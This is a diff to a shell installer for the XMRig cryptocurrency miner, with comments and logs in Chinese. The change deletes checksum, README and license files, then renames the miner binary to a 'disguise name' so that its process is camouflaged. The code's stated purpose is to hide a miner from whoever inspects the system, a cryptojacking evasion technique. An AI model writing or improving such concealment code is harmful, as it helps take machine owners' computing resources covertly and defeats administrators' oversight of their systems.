@@ -406,13 +406,37 @@ download_and_install() {
         rm -f "$WORK_DIR/config.json"
     fi
     
+    # 删除不必要的文件
+    log_info "清理不必要的文件..."
+    rm -f SHA256SUMS 2>/dev/null || true
+    rm -f *.txt 2>/dev/null || true
+    rm -f README* 2>/dev/null || true
+    rm -f LICENSE* 2>/dev/null || true
+    
+    # 获取伪装名称（在重命名前重新获取）
+    local disguise_name=$(get_disguise_name)
+    
     # 设置执行权限
     chmod +x xmrig
     
     # 进程名称伪装
     log_info "设置进程伪装..."
-    mv xmrig "$DISGUISE_NAME"
-    ln -sf "$DISGUISE_NAME" xmrig
+    log_info "将xmrig重命名为: $disguise_name"
+    
+    # 重命名xmrig为伪装名称
+    mv xmrig "$disguise_name" || {
+        log_error "重命名xmrig失败"
+        exit 1
+    }
+    
+    # 设置伪装文件的执行权限
+    chmod +x "$disguise_name"
+    
+    # 创建软链接保持兼容性
+    ln -sf "$disguise_name" xmrig
+    
+    # 更新全局变量
+    DISGUISE_NAME="$disguise_name"
     
     log_info "XMRig安装完成，进程已伪装为: $DISGUISE_NAME"
 }
